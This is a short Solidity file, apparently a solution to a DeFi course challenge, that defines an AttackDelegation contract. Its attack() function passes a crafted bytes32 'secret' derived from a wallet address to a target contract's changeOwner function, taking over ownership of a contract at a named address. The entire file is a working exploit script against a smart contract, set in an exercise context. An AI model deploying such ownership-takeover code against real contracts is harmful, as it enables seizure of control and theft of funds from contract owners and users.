// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'https://github.com/spockwall/Defi_HW3/blob/main/Challenges/Delegation.sol';

interface ITargetContract {
    function changeOwner(bytes32, address) external;
}
contract AttackDelegation {
    address _targetContractAddress;
    ITargetContract delegation;

    constructor(address targetContractAddress) {
        _targetContractAddress = targetContractAddress;
        delegation = ITargetContract(_targetContractAddress);
    }
    
    function attack() public payable {
        /*
            Delegation Address: 0x3A0A2Ef5d4cbE9Ad6E67bf5ffAB456d84B327c25
        */
        address wallet_address = 0x35e8CEaF2A504f9f1ce50F4366CF50Fb1E8784d6;
        //bytes32 secret = bytes32(uint256(uint168(0x0135e8CEaF2A504f9f1ce50F4366CF50Fb1E8784d6)));
        bytes32 secret = hex"00000000000000000000000135e8CEaF2A504f9f1ce50F4366CF50Fb1E8784d6";
        delegation.changeOwner(secret, wallet_address);
    }
}
